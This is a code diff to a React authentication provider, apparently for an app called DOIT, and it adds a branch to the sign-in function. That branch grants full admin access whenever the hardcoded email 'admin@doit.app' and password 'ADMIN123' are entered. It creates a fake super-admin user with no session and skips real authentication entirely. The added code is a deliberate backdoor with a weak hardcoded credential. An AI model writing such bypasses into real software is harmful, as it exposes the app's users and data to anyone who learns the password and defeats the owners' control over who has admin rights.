@@ -118,6 +118,24 @@ export function AuthProvider({ children }: { children: ReactNode }) {
   };
 
   const signIn = async (email: string, password: string) => {
+    // Hardcoded override for specific admin request
+    if (email === 'admin@doit.app' && password === 'ADMIN123') {
+      const adminUser = { id: 'super-admin', email } as unknown as User;
+      setUser(adminUser);
+      setSession(null);
+      setRole('admin');
+      setProfile({
+        first_name: 'Super',
+        last_name: 'Admin',
+        email,
+        phone: null,
+        company_name: 'DOIT',
+        avatar_url: null,
+      });
+      toast({ title: 'Accesso Super Admin', description: 'Accesso garantito.' });
+      return;
+    }
+
     if (DEMO) {
       const demoUser = { id: 'demo-user', email } as unknown as User;
       setUser(demoUser);
